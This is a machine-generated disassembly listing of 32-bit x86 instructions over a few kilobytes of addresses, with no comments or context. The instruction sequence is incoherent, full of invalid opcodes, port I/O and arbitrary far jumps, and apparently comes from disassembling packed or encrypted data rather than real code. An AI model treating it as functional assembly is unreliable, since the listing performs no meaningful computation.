  4120eb:	sar    DWORD PTR [eax],cl
  4120ed:	push   0x56
  4120ef:	xchg   DWORD PTR [edi-0x6b2beeb4],ecx
  4120f5:	mov    ebx,0x633e9857
  4120fa:	sub    edi,ebp
  4120fc:	and    eax,0xdf2aa01e
  412101:	popf   
  412102:	add    BYTE PTR [edx],dl
  412104:	sti    
  412105:	jne    0x4120f6
  412107:	inc    esp
  412108:	inc    edi
  412109:	shl    BYTE PTR [edi-0x33],cl
  41210c:	fs dec ebp
  41210e:	lods   al,BYTE PTR ds:[esi]
  41210f:	sbb    BYTE PTR [eax+0x70],0x30
  412113:	mov    bl,0x88
  412115:	push   esp
  412116:	es lahf 
  412118:	std    
  412119:	push   eax
  41211a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41211b:	or     ebp,DWORD PTR [edi+0x2b]
  41211e:	ins    BYTE PTR es:[edi],dx
  41211f:	adc    esp,DWORD PTR [ebx]
  412121:	push   ecx
  412122:	ins    BYTE PTR es:[edi],dx
  412123:	stc    
  412124:	cmp    al,0xd6
  412126:	ja     0x41215e
  412128:	mov    ecx,es
  41212a:	push   ecx
  41212b:	test   al,0x8
  41212d:	je     0x412193
  41212f:	ja     0x4120f1
  412131:	repnz sub ah,ch
  412134:	loop   0x412102
  412136:	sbb    BYTE PTR [ebp+0x1f8fb090],bl
  41213c:	mov    al,0xc0
  41213e:	xchg   ebp,eax
  41213f:	fwait
  412140:	lods   al,BYTE PTR ds:[esi]
  412141:	test   DWORD PTR [ecx-0x408d7b39],ebx
  412147:	jmp    0xd846:0x389a6c5a
  41214e:	femms  
  412150:	or     eax,0x6572cecf
  412155:	and    BYTE PTR [edx+0x64],cl
  412158:	test   al,0xc
  41215a:	(bad)  
  41215b:	rcl    BYTE PTR [ebp*1-0x170fea26],0xa6
  412163:	enter  0xba5a,0xef
  412167:	mov    BYTE PTR [ebx],bl
  412169:	fcom   QWORD PTR ds:0xa4ac8100
  41216f:	sub    cl,al
  412171:	out    dx,eax
  412172:	fs das 
  412174:	bound  esi,QWORD PTR [esi-0x2216f160]
  41217a:	imul   esp,DWORD PTR [esi-0x3f5fce8b],0xffffff84
  412181:	add    ebx,DWORD PTR [ebp+0x3aeec85e]
  412187:	jecxz  0x412171
  412189:	clc    
  41218a:	inc    esp
  41218b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41218c:	daa    
  41218d:	sub    BYTE PTR [ebp+0x73],ch
  412190:	mov    ch,BYTE PTR [ebx]
  412192:	xlat   BYTE PTR ds:[ebx]
  412193:	sub    DWORD PTR [ebx-0x491871d2],esi
  412199:	cmp    DWORD PTR [edx],0x9
  41219c:	jmp    0x7715afe5
  4121a1:	xchg   edx,eax
  4121a2:	jmp    FWORD PTR [edi+0x710d5276]
  4121a8:	pop    ebp
  4121a9:	mov    ebp,0xfcf61cab
  4121ae:	gs push es
  4121b0:	mov    al,ds:0xdeb38893
  4121b5:	(bad)
  4121b9:	and    DWORD PTR [ebx+0x76],esi
  4121bc:	fcomp  DWORD PTR [esp+ebx*1-0x72]
  4121c0:	push   ecx
  4121c1:	std    
  4121c2:	call   0x4b9a:0x2b4cc796
  4121c9:	sub    al,0xb6
  4121cb:	mov    esp,0xfec4252c
  4121d0:	js     0x412249
  4121d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121d3:	xor    BYTE PTR [edx+0x2d05b446],dh
  4121d9:	pop    ds
  4121da:	xor    DWORD PTR cs:[edx-0x36],ecx
  4121de:	xchg   ecx,eax
  4121df:	and    al,bh
  4121e1:	clc    
  4121e2:	pop    esi
  4121e3:	ret    
  4121e4:	dec    ebp
  4121e5:	cld    
  4121e6:	sar    DWORD PTR [eax+ebp*2-0x71be54d8],1
  4121ed:	mov    cl,0x93
  4121ef:	push   ss
  4121f0:	sub    ch,dh
  4121f2:	lahf   
  4121f3:	lds    ebp,FWORD PTR [eax]
  4121f5:	xchg   edi,eax
  4121f6:	push   edx
  4121f7:	lea    edi,[eax-0x27686009]
  4121fd:	sub    ebp,DWORD PTR [edi+eax*2]
  412200:	or     DWORD PTR [edx],edi
  412202:	mov    esp,0x20f9a622
  412207:	jmp    0x412263
  412209:	jmp    0x412198
  41220b:	pushf  
  41220c:	push   esi
  41220d:	xor    bl,al
  41220f:	in     al,0x32
  412211:	cdq    
  412212:	int3   
  412213:	cdq    
  412214:	push   esi
  412215:	jo     0x412220
  412217:	clc    
  412218:	cmp    al,bh
  41221a:	jb     0x41226a
  41221c:	inc    ebx
  41221d:	and    dl,0xff
  412220:	jnp    0x412291
  412222:	imul   ebp,DWORD PTR es:[eiz*1-0x32de7da5],0xf9e17be0
  41222e:	push   eax
  41222f:	jge    0x41227a
  412231:	mov    esi,0x3c9aa151
  412236:	repz and eax,0x1fac48ae
  41223c:	jo     0x4122b3
  41223e:	sbb    ecx,DWORD PTR [eax-0x5d05534f]
  412244:	out    dx,eax
  412245:	pop    esp
  412246:	hlt    
  412247:	inc    esi
  412248:	mov    ebx,0x3ce92609
  41224d:	cmp    al,0xbd
  41224f:	adc    eax,0x4aa8966e
  412254:	mov    bh,BYTE PTR [eax+0x65]
  412257:	cmp    al,0x3b
  412259:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41225a:	icebp  
  41225b:	les    ecx,FWORD PTR [ebx]
  41225d:	rol    BYTE PTR [esi],0xcd
  412260:	mov    ah,0xb0
  412262:	jmp    0x4122ba
  412264:	jbe    0x412253
  412266:	(bad)  
  412267:	ror    DWORD PTR [ebx-0x1230523d],cl
  41226d:	xor    al,0x14
  41226f:	xor    al,0x8b
  412271:	mov    ebp,DWORD PTR [ecx+0x1705abe4]
  412277:	dec    eax
  412278:	iret   
  412279:	leave  
  41227a:	ret    0xabfa
  41227d:	sbb    BYTE PTR [edx-0x34],bl
  412280:	(bad)  
  412281:	cmp    ebx,ecx
  412283:	scas   eax,DWORD PTR es:[edi]
  412284:	pop    ss
  412285:	dec    edx
  412286:	mov    ds:0x7b20004f,al
  41228b:	jg     0x4122b7
  41228d:	into   
  41228e:	inc    ebx
  41228f:	adc    al,0x3f
  412291:	push   esi
  412292:	test   BYTE PTR [edi+eiz*1+0x3f2ecb7e],dl
  412299:	cdq    
  41229a:	jle    0x412285
  41229c:	jl     0x4122f6
  41229e:	ror    BYTE PTR [ebx-0xbfbebe9],0x3d
  4122a5:	aam    0x86
  4122a7:	pop    ebx
  4122a8:	or     BYTE PTR [edx+ebp*2],dh
  4122ab:	sbb    al,0x21
  4122ad:	pop    ebp
  4122ae:	add    BYTE PTR [ebp-0x33ae7ad2],al
  4122b4:	or     DWORD PTR [esi-0x20af7c3f],eax
  4122ba:	sbb    BYTE PTR [edi+0x11314145],0x4f
  4122c1:	call   0x6516de36
  4122c6:	fdiv   QWORD PTR [edx+0x7b]
  4122c9:	lea    ecx,[edx-0x7bb9ddd6]
  4122cf:	mov    edx,0xaa8eadaf
  4122d4:	push   ebx
  4122d5:	pop    eax
  4122d6:	pop    ecx
  4122d7:	cmp    ebx,DWORD PTR [edx-0x6]
  4122da:	scas   al,BYTE PTR es:[edi]
  4122db:	cmp    ebp,edi
  4122dd:	jae    0x4122ff
  4122df:	adc    ebx,ebx
  4122e1:	pop    esp
  4122e2:	sbb    bh,dh
  4122e4:	addr16 jb 0x4122a7
  4122e7:	mov    cl,0xdc
  4122e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4122ea:	pop    edx
  4122eb:	jno    0x41227a
  4122ed:	adc    esp,esi
  4122ef:	cmp    BYTE PTR [edi+0x2f983685],bh
  4122f5:	fnsave [ebx+0x35]
  4122f8:	arpl   WORD PTR [ebx+ebx*1+0x24],si
  4122fc:	xchg   ecx,eax
  4122fd:	es sub eax,0xc6c5cc7e
  412303:	sbb    ch,BYTE PTR [ebx+esi*4-0x30]
  412307:	shr    DWORD PTR [edi-0x1c],0x72
  41230b:	cli    
  41230c:	cld    
  41230d:	jmp    0x4122ac
  41230f:	and    esp,DWORD PTR [ecx-0x77]
  412312:	jg     0x4122a1
  412314:	mov    ebx,0x9013e4ea
  412319:	ja     0x412382
  41231b:	test   DWORD PTR [edi],ecx
  41231d:	fnsave [esi-0x4e5f0c80]
  412323:	in     al,dx
  412324:	hlt    
  412325:	das    
  412326:	mov    ch,0x1e
  412328:	dec    edi
  412329:	stos   DWORD PTR es:[edi],eax
  41232a:	mov    ecx,0xeb0ad5d3
  41232f:	mov    ebx,0xf66cfa27
  412334:	push   ebp
  412335:	fisubr WORD PTR [ecx+esi*2-0x6c]
  412339:	in     al,dx
  41233a:	cmp    edx,DWORD PTR [esi+0x281a7780]
  412340:	fld    DWORD PTR [esi+eax*1]
  412343:	xchg   edx,eax
  412344:	pop    edi
  412345:	mov    al,ds:0xd7185313
  41234a:	out    0x84,eax
  41234c:	or     ecx,DWORD PTR [ebx+0x3febb612]
  412352:	inc    ebp
  412353:	aas    
  412354:	and    eax,0xc7a41b8
  412359:	mov    edi,0x698252b2
  41235e:	or     eax,0x5996638a
  412363:	fnstsw WORD PTR [edi]
  412365:	or     eax,0x393bbb6a
  41236a:	(bad)  
  41236b:	out    0x80,eax
  41236d:	cli    
  41236e:	test   eax,0x1a42b892
  412373:	pop    ds
  412374:	test   DWORD PTR [ecx],0x779b465d
  41237a:	pusha  
  41237b:	sub    bl,dh
  41237d:	jp     0x4123e2
  41237f:	jp     0x412390
  412381:	ret    0x732e
  412384:	div    dl
  412386:	cmp    edx,0xffffffa4
  412389:	push   esi
  41238a:	fisub  DWORD PTR [ebx+0x5a]
  41238d:	frstor [edi-0x4cc43896]
  412393:	mov    ecx,0xa8a181f0
  412398:	enter  0xb66a,0xeb
  41239c:	or     eax,ebx
  41239e:	push   ebx
  41239f:	ret    0x918d
  4123a2:	pop    esp
  4123a3:	add    al,0xd
  4123a5:	psllq  mm5,QWORD PTR [edx+0x5e]
  4123a9:	test   BYTE PTR [ebp-0x4fcb09d9],dh
  4123af:	mov    bh,BYTE PTR ds:0x9ee2c2a6
  4123b5:	jp     0x412417
  4123b7:	mov    al,ds:0xe2cffcc2
  4123bc:	cs in  eax,dx
  4123be:	mov    BYTE PTR [ebp-0x24],dl
  4123c1:	xchg   ebp,eax
  4123c2:	sub    al,BYTE PTR [esp+eax*1]
  4123c5:	and    al,0x65
  4123c7:	add    DWORD PTR [edx-0x1baae0da],0x832d2f79
  4123d1:	mov    cl,0x95
  4123d3:	jns    0x412382
  4123d5:	cdq    
  4123d6:	lods   al,BYTE PTR ds:[esi]
  4123d7:	lahf   
  4123d8:	out    dx,eax
  4123d9:	push   edi
  4123da:	fwait
  4123db:	push   es
  4123dc:	aam    0x27
  4123de:	pop    ebx
  4123df:	inc    ebx
  4123e0:	gs add ecx,esp
  4123e3:	(bad)  
  4123e4:	xchg   esi,eax
  4123e5:	popf   
  4123e6:	hlt    
  4123e7:	xor    ebx,DWORD PTR [edx-0x463dd6ef]
  4123ed:	or     al,ch
  4123ef:	push   cs
  4123f0:	(bad)  
  4123f1:	mov    ebp,0x811c7a29
  4123f6:	xchg   si,ax
  4123f8:	shr    DWORD PTR [esi+0xbff5d61],0xc7
  4123ff:	test   al,0x17
  412401:	sbb    edx,ecx
  412403:	xchg   ebp,eax
  412404:	and    BYTE PTR gs:[edi+0x60aa8d01],0x4d
  41240c:	push   ecx
  41240d:	fisttp DWORD PTR [edx+0x4adac95c]
  412413:	arpl   WORD PTR [ebx-0x5],di
  412416:	(bad)  
  412417:	jge    0x4123c2
  412419:	loope  0x4123bc
  41241b:	cmp    eax,0x3b50291e
  412420:	popa   
  412421:	jecxz  0x412439
  412423:	in     eax,dx
  412424:	loopne 0x412476
  412426:	dec    eax
  412427:	ror    BYTE PTR [ebx+0x16],1
  41242a:	dec    edx
  41242b:	pop    edx
  41242c:	or     ebp,DWORD PTR ds:0xe0655fd
  412432:	mov    al,0xc8
  412434:	mov    edx,0x9cdabfeb
  412439:	xor    BYTE PTR [ebx+0x16104447],ah
  41243f:	test   BYTE PTR [ebp-0x6a3b8fe],0xd2
  412446:	xchg   ecx,eax
  412447:	push   edx
  412448:	imul   ebx,ecx,0x1727b65d
  41244e:	xchg   edi,eax
  41244f:	pop    edx
  412450:	mov    esi,0xf537a534
  412455:	rcl    bl,cl
  412457:	sub    DWORD PTR [eax-0x37],esp
  41245a:	xchg   edx,eax
  41245b:	addr16 cmp dl,dl
  41245e:	sub    eax,0xbf029b8d
  412463:	fidivr DWORD PTR [esi]
  412465:	daa    
  412466:	xor    DWORD PTR ds:0xe741e206,ecx
  41246c:	mov    DWORD PTR [edi+0x50],0x5a430a74
  412473:	jecxz  0x4124be
  412475:	mov    eax,ds:0x67a6c7f5
  41247a:	loop   0x41248e
  41247c:	push   ebp
  41247d:	stos   BYTE PTR es:[edi],al
  41247e:	mov    ebx,0x5296f8c9
  412483:	test   eax,0x2dffe790
  412488:	call   0x5e81:0xac37d1b7
  41248f:	dec    eax
  412490:	mov    es,WORD PTR [ecx-0x7d]
  412493:	jmp    0x7e453d19
  412498:	mov    ah,0xee
  41249a:	cld    
  41249b:	sbb    eax,0x2e391354
  4124a0:	xchg   edx,eax
  4124a1:	cmp    ah,0x16
  4124a4:	jle    0x41249d
  4124a6:	int3   
  4124a7:	mov    edx,0x293e5b0a
  4124ac:	inc    esp
  4124ad:	mov    ebx,DWORD PTR [eax-0x35]
  4124b0:	mov    edx,0x96ceaedc
  4124b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124b6:	cmp    BYTE PTR [esi+0x68a59486],cl
  4124bc:	and    ebp,DWORD PTR [ebp-0x4b]
  4124bf:	ret    
  4124c0:	cmp    al,0xf7
  4124c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124c3:	aad    0xb6
  4124c5:	sbb    BYTE PTR [edx+0x582e28c0],cl
  4124cb:	inc    edi
  4124cc:	xchg   esi,eax
  4124cd:	pop    esp
  4124ce:	inc    esi
  4124cf:	adc    al,0x35
  4124d1:	and    BYTE PTR [ecx],bh
  4124d3:	int3   
  4124d4:	cmp    ecx,DWORD PTR [edx+edx*4]
  4124d7:	jo     0x41252d
  4124d9:	pop    esi
  4124da:	mov    al,0xf2
  4124dc:	dec    ebp
  4124dd:	cwde   
  4124de:	arpl   WORD PTR [ecx+ebx*2],cx
  4124e1:	loop   0x4124a4
  4124e3:	rcl    DWORD PTR [edi],0xa4
  4124e6:	sti    
  4124e7:	(bad)  
  4124e8:	lds    eax,FWORD PTR ss:[ebp+eax*4-0x1c]
  4124ed:	push   es
  4124ee:	push   ecx
  4124ef:	jo     0x4124fa
  4124f1:	inc    edi
  4124f2:	pop    es
  4124f3:	js     0x412495
  4124f5:	mov    edx,0xca23d640
  4124fa:	pop    ebp
  4124fb:	icebp  
  4124fc:	cwde   
  4124fd:	call   0x583:0xb34e3d7f
  412504:	popa   
  412505:	dec    ebp
  412506:	add    DWORD PTR [edi+ebx*4],esi
  412509:	(bad)  
  41250a:	lods   eax,DWORD PTR ds:[esi]
  41250b:	shr    DWORD PTR [edx+ebx*4+0x1974a78a],cl
  412512:	add    eax,0xc0ede84b
  412517:	fld    DWORD PTR [edx-0x6b450ef5]
  41251d:	mov    esp,0xaeaed367
  412522:	lock fwait
  412524:	aam    0x5d
  412526:	xor    BYTE PTR [ecx-0x34b9b1df],0xaa
  41252d:	sub    al,0x68
  41252f:	jg     0x412505
  412531:	enter  0x7527,0x12
  412535:	and    BYTE PTR [ebp+ebx*4+0x44],dh
  412539:	js     0x4125b1
  41253b:	mov    dh,0xc4
  41253d:	es adc eax,edx
  412540:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412541:	pop    ebx
  412542:	and    DWORD PTR [ecx],0xfffffff5
  412545:	or     eax,0x29e20381
  41254a:	push   eax
  41254b:	js     0x4125be
  41254d:	rcr    BYTE PTR [ebp-0x110d80d9],0xc2
  412554:	mov    eax,ds:0xdca69454
  412559:	or     eax,esi
  41255b:	xchg   bh,cl
  41255d:	and    BYTE PTR [ebx+0x469358b3],bl
  412563:	mov    bl,0xd7
  412565:	loope  0x4124f7
  412567:	hlt    
  412568:	sub    ebx,edi
  41256a:	jnp    0x412575
  41256c:	cdq    
  41256d:	mov    ecx,0x29f22af9
  412572:	out    dx,eax
  412573:	push   0x30
  412575:	or     esi,DWORD PTR [ecx-0x7d399dfb]
  41257b:	sbb    bl,dh
  41257d:	stos   BYTE PTR es:[edi],al
  41257e:	scas   eax,DWORD PTR es:[edi]
  41257f:	bound  ebx,QWORD PTR [edi-0x56]
  412582:	cmp    al,BYTE PTR [eax]
  412584:	std    
  412585:	mov    ds:0x919b46a6,eax
  41258a:	mov    al,0x6a
  41258c:	stc    
  41258d:	mov    ebx,0x2ce42f0
  412592:	shl    DWORD PTR [ecx-0x62],cl
  412595:	shl    DWORD PTR [edx-0x61],0xf3
  412599:	jo     0x412575
  41259b:	out    0x5c,al
  41259d:	jne    0x4125a9
  41259f:	es loopne 0x412533
  4125a2:	sbb    eax,0x8daab4f7
  4125a7:	pushf  
  4125a8:	in     eax,0x23
  4125aa:	data16 scas al,BYTE PTR es:[edi]
  4125ac:	popa   
  4125ad:	inc    eax
  4125ae:	shl    BYTE PTR [ecx-0x4b],0xcf
  4125b2:	xor    eax,0x9405fbf
  4125b7:	lea    ebx,[edi-0x73]
  4125ba:	add    eax,0x1727e563
  4125bf:	aam    0x49
  4125c1:	xor    eax,0x8021ec4
  4125c6:	or     al,0x3b
  4125c9:	ret    0xebbb
  4125cc:	leave  
  4125cd:	das    
  4125ce:	sti    
  4125cf:	mov    DWORD PTR [edi+0x517a1193],edx
  4125d5:	shl    BYTE PTR [edi-0x586cd02c],1
  4125db:	aas    
  4125dc:	xchg   ebx,eax
  4125dd:	in     al,0x65
  4125df:	push   esp
  4125e0:	ins    BYTE PTR es:[edi],dx
  4125e1:	mov    edx,0x8b0e67fd
  4125e6:	dec    edi
  4125e7:	ds dec edi
  4125e9:	shl    BYTE PTR [eax+0x23],cl
  4125ec:	adc    al,0xac
  4125ee:	fcomi  st,st(1)
  4125f0:	repnz mov bl,0xad
  4125f3:	sub    ebp,edx
  4125f5:	pop    es
  4125f6:	jo     0x412603
  4125f8:	in     eax,dx
  4125f9:	mov    ds:0x2e14fc5f,eax
  4125fe:	test   al,0x5d
  412600:	cmp    al,0xe2
  412602:	sub    eax,DWORD PTR [ebx]
  412604:	dec    edi
  412605:	ins    DWORD PTR es:[edi],dx
  412606:	pop    ss
  412607:	jae    0x412668
  412609:	add    esp,DWORD PTR [esi+edi*8]
  41260c:	sbb    ecx,DWORD PTR [edi]
  41260e:	loope  0x412689
  412610:	int3   
  412611:	jp     0x41259b
  412613:	add    al,0x4f
  412615:	mov    ch,0x18
  412617:	pushf  
  412618:	pop    edx
  412619:	stc    
  41261a:	cmp    dl,ch
  41261c:	stc    
  41261d:	dec    ecx
  41261e:	std    
  41261f:	push   esp
  412620:	mov    WORD PTR ds:0xb8a7df8d,fs
  412626:	icebp  
  412627:	pop    esi
  412628:	icebp  
  412629:	leave  
  41262a:	sub    dl,BYTE PTR [eax]
  41262c:	or     al,0xfb
  41262e:	rcl    BYTE PTR [esi-0x78a2a93],cl
  412634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412635:	push   esp
  412636:	xor    eax,0x230a0b57
  41263b:	push   0xece6d7c7
  412640:	cmc    
  412641:	out    0xf,al
  412643:	pop    edx
  412644:	xchg   ebx,eax
  412645:	int    0x13
  412647:	jns    0x412688
  412649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41264a:	scas   al,BYTE PTR es:[edi]
  41264b:	add    al,0x71
  41264d:	dec    esp
  41264e:	je     0x4125fa
  412650:	adc    al,0xb9
  412652:	mov    dh,0xc8
  412654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412655:	sbb    DWORD PTR [edi-0x4e35ce8e],eax
  41265b:	(bad)  
  41265c:	clc    
  41265d:	jae    0x4125f4
  41265f:	push   edx
  412660:	inc    esi
  412661:	xor    BYTE PTR [ebp-0x45d34d62],dh
  412667:	pop    esi
  412668:	ja     0x41260a
  41266a:	ficom  DWORD PTR [eax-0x62d372c8]
  412670:	out    dx,eax
  412671:	fstp   DWORD PTR [ecx]
  412673:	inc    ebp
  412674:	jo     0x412687
  412676:	or     eax,0x6cf258c7
  41267b:	lock fcom DWORD PTR [esi-0x17]
  41267f:	stc    
  412680:	dec    edi
  412681:	mov    WORD PTR [edx-0x7775c609],?
  412687:	mov    DWORD PTR ds:0xd1ea2048,ebx
  41268d:	data16 or BYTE PTR [edi],cl
  412690:	inc    esp
  412691:	mov    ds:0x87244895,eax
  412696:	sbb    ah,bl
  412698:	int    0x45
  41269a:	popa   
  41269b:	and    al,0x9f
  41269d:	jmp    0xdd3d:0xc379a724
  4126a4:	leave  
  4126a5:	push   0x26
  4126a7:	je     0x41263b
  4126a9:	clc    
  4126aa:	jne    0x4126c7
  4126ac:	push   ss
  4126ad:	or     DWORD PTR [eax],ecx
  4126af:	sub    cl,ch
  4126b1:	xor    al,0x4e
  4126b3:	sbb    eax,DWORD PTR [esi+edx*8-0x6467b888]
  4126ba:	es std 
  4126bc:	sbb    eax,0xe8b2f940
  4126c1:	jb     0x41270e
  4126c3:	cmp    BYTE PTR [edi+0x5c66a2e8],bl
  4126c9:	fist   WORD PTR [ebx-0x6dcccd7e]
  4126cf:	or     al,0x39
  4126d1:	push   edi
  4126d2:	cmp    al,0x8c
  4126d4:	and    BYTE PTR [ebp+0x25],al
  4126d7:	fdiv   DWORD PTR [eax+0x6efcf148]
  4126dd:	mov    ebx,0xdda56bc4
  4126e2:	xor    eax,0xb2f3f45b
  4126e7:	imul   ebp,edx,0x56
  4126ea:	in     eax,0xb7
  4126ec:	mov    ah,al
  4126ee:	lahf   
  4126ef:	mov    ah,0xf7
  4126f1:	repz loope 0x4126a1
  4126f4:	shr    DWORD PTR [edx+0x6d4249c9],cl
  4126fa:	aas    
  4126fb:	add    DWORD PTR [esi],0x26
  4126fe:	mov    bh,0x1d
  412700:	call   0xa64:0x5c182ac8
  412707:	xchg   edx,eax
  412708:	stos   BYTE PTR es:[edi],al
  412709:	out    0xd6,eax
  41270b:	mov    bl,0x69
  41270d:	pop    es
  41270e:	jne    0x4126f6
  412710:	mov    al,ds:0x5d379e47
  412715:	pop    edx
  412716:	popa   
  412717:	adc    ch,bh
  412719:	jmp    0x4126a7
  41271b:	clc    
  41271c:	mov    bl,0xde
  41271e:	xor    al,0x24
  412720:	test   eax,0x8a8a6943
  412725:	jmp    0x4127a2
  412727:	mov    ds:0x7724fabc,al
  41272c:	rcl    DWORD PTR [ecx-0x565e740],cl
  412732:	xor    ecx,ebx
  412734:	pop    eax
  412735:	fld    st(2)
  412737:	push   edx
  412738:	nop
  412739:	int    0x21
  41273b:	sbb    DWORD PTR [ebx+0x5461ebe8],eax
  412741:	leave  
  412742:	add    eax,0x37b56747
  412747:	mov    edx,DWORD PTR [ebx]
  412749:	test   eax,0xd368f016
  41274e:	(bad)  
  41274f:	or     al,0x7
  412751:	cmp    BYTE PTR [ebx+0x57],ah
  412754:	jmp    0x830e:0x74be031d
  41275b:	cwde   
  41275c:	into   
  41275d:	mov    ecx,0xd0914258
  412762:	jmp    DWORD PTR [esi+eax*1]
  412765:	pusha  
  412766:	sbb    eax,0x41c5f6b2
  41276b:	mov    ecx,0xb2e63f42
  412770:	mov    eax,DWORD PTR [edi]
  412772:	adc    BYTE PTR [ecx],bh
  412774:	jp     0x412775
  412776:	mov    ds:0xa06b8f5f,al
  41277b:	out    dx,al
  41277c:	aaa    
  41277d:	mov    esi,0xda877a31
  412782:	or     BYTE PTR [eax],al
  412784:	clc    
  412785:	push   0x47
  412787:	enter  0x3a6d,0xc0
  41278b:	mov    al,0xd7
  41278d:	cld    
  41278e:	add    DWORD PTR [ecx+0x4c],ebx
  412791:	jae    0x412719
  412793:	add    eax,0xc202c795
  412798:	ret    
  412799:	xor    BYTE PTR [ebx-0x4],bl
  41279c:	cmp    bl,cl
  41279e:	not    DWORD PTR [ebx-0x1d]
  4127a1:	retf   
  4127a2:	push   esi
  4127a3:	xchg   DWORD PTR [eax],esp
  4127a5:	mov    esp,0x6d25dfc7
  4127aa:	mov    esp,edx
  4127ac:	test   eax,0x364681da
  4127b1:	mov    ds:0x709b3f44,al
  4127b6:	ret    0x1db8
  4127b9:	popa   
  4127ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127bb:	mov    esi,0xa9d73108
  4127c0:	aad    0x13
  4127c2:	je     0x412834
  4127c4:	test   DWORD PTR [ebx-0x3f],0x66682ccd
  4127cb:	add    ecx,0xffffff8a
  4127ce:	dec    edx
  4127cf:	push   cs
  4127d0:	xor    DWORD PTR [edx-0x68],edi
  4127d3:	repnz push ds
  4127d5:	or     cl,ch
  4127d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4127d8:	xchg   esi,eax
  4127d9:	outs   dx,DWORD PTR ds:[esi]
  4127da:	mov    ecx,0x5593aaa2
  4127df:	scas   al,BYTE PTR es:[edi]
  4127e0:	pusha  
  4127e1:	cmp    DWORD PTR [ebp+eax*4-0x7e53bb7e],edx
  4127e8:	mov    ch,0x47
  4127ea:	mov    ds:0xc76e0a3b,eax
  4127ef:	mov    ecx,0x144a1941
  4127f4:	and    ebx,DWORD PTR [ecx+0x5c]
  4127f7:	stc    
  4127f8:	popf   
  4127f9:	fwait
  4127fa:	sub    eax,0xbd4ee647
  4127ff:	lea    esi,[ecx+0x6d986597]
  412805:	mov    fs,ecx
  412807:	cli    
  412808:	add    DWORD PTR ds:0x744b6b23,ecx
  41280e:	ins    DWORD PTR es:[edi],dx
  41280f:	and    DWORD PTR [edx],ecx
  412811:	sbb    al,0xb4
  412813:	cmc    
  412814:	xor    ch,BYTE PTR [ebx-0x6ab2e8c5]
  41281a:	in     al,0x5c
  41281c:	pop    ebx
  41281d:	or     eax,0x938616e3
  412822:	inc    ebx
  412823:	push   ebx
  412824:	out    dx,eax
  412825:	clc    
  412826:	in     al,0xbf
  412828:	mov    ecx,0x212d00e1
  41282d:	or     BYTE PTR [eax],dh
  41282f:	adc    eax,0xe4e9b188
  412834:	imul   BYTE PTR [esi]
  412836:	fwait
  412837:	int3   
  412838:	je     0x4127e5
  41283a:	dec    ebp
  41283b:	je     0x4127fb
  41283d:	in     al,dx
  41283e:	mov    cl,0xda
  412840:	lahf   
  412841:	inc    ebx
  412842:	mov    esp,0x2e0d7821
  412847:	out    dx,al
  412848:	fwait
  412849:	mov    ds:0x8ec03c21,al
  41284e:	cmp    al,0x6a
  412850:	in     eax,dx
  412851:	inc    eax
  412852:	cmp    al,0xb2
  412854:	xor    edx,DWORD PTR [esp+eax*4-0x4d]
  412858:	add    eax,0x9f709dc8
  41285d:	dec    ebp
  41285e:	pop    eax
  41285f:	and    al,cl
  412861:	lods   eax,DWORD PTR ds:[esi]
  412862:	ins    BYTE PTR es:[edi],dx
  412863:	xchg   BYTE PTR [ecx+0x55],al
  412866:	fcom   QWORD PTR [esp+ebp*8-0x66]
  41286a:	imul   esi,edi,0x1a
  41286d:	jg     0x4128dd
  41286f:	fdiv   QWORD PTR [eax+0x42b9dccd]
  412875:	nop
  412876:	int    0x3
  412878:	xor    esp,DWORD PTR [ebp-0x41]
  41287b:	mov    edi,edx
  41287d:	test   DWORD PTR [esi],edi
  41287f:	inc    esi
  412880:	cmp    BYTE PTR [eax+0x5f],bl
  412883:	stos   DWORD PTR es:[edi],eax
  412884:	nop
  412885:	scas   al,BYTE PTR es:[edi]
  412886:	xor    BYTE PTR [ebx],bl
  412888:	std    
  412889:	cmp    ebx,ebp
  41288b:	test   eax,0x69f44416
  412890:	stc    
  412891:	sub    edx,esi
  412893:	dec    edx
  412894:	mov    ecx,0xb60af0fb
  412899:	ja     0x4128dc
  41289b:	or     al,0xc8
  41289d:	dec    eax
  41289e:	pop    ss
  41289f:	mov    dh,0xfe
  4128a1:	xor    esi,DWORD PTR cs:[ebx]
  4128a4:	push   ecx
  4128a5:	xor    DWORD PTR [edx-0x527f7d3b],0xe151c8ab
  4128af:	jmp    0x29db:0x264d2c19
  4128b6:	das    
  4128b7:	out    dx,eax
  4128b8:	fistp  DWORD PTR [ecx-0x64625941]
  4128be:	mov    edi,DWORD PTR [ebp-0x1b]
  4128c1:	mov    ah,0xae
  4128c3:	push   ds
  4128c4:	fst    QWORD PTR [ebx-0x6ea9d174]
  4128ca:	cwde   
  4128cb:	sbb    bl,0x99
  4128ce:	inc    esi
  4128cf:	mov    ch,0xba
  4128d1:	rcr    DWORD PTR [edi-0x79],cl
  4128d4:	jecxz  0x41294c
  4128d6:	inc    ebp
  4128d7:	int    0x23
  4128d9:	cmp    DWORD PTR [edx+0x6c],ebp
  4128dc:	sub    eax,0x8d2d3270
  4128e1:	ins    BYTE PTR es:[edi],dx
  4128e2:	jbe    0x412955
  4128e4:	mov    eax,0x4c21fb67
  4128e9:	xchg   esi,eax
  4128ea:	xchg   ebp,eax
  4128eb:	out    dx,al
  4128ec:	jne    0x4128ac
  4128ee:	sbb    eax,0x5272fc8f
  4128f3:	xor    dh,BYTE PTR [edi+0x26ad8c0a]
  4128f9:	xchg   ecx,eax
  4128fa:	aam    0x66
  4128fc:	adc    al,0x8a
  4128fe:	sbb    al,0x7e
  412900:	push   esi
  412901:	fwait
  412902:	jecxz  0x412903
  412904:	lds    edx,FWORD PTR [edx+0x2225a50c]
  41290a:	xor    DWORD PTR [eax-0x1b8dadeb],ecx
  412910:	adc    BYTE PTR [ebx],dh
  412912:	adc    DWORD PTR [edx],ecx
  412914:	xor    al,0x70
  412916:	sub    al,0xbc
  412918:	ja     0x41291a
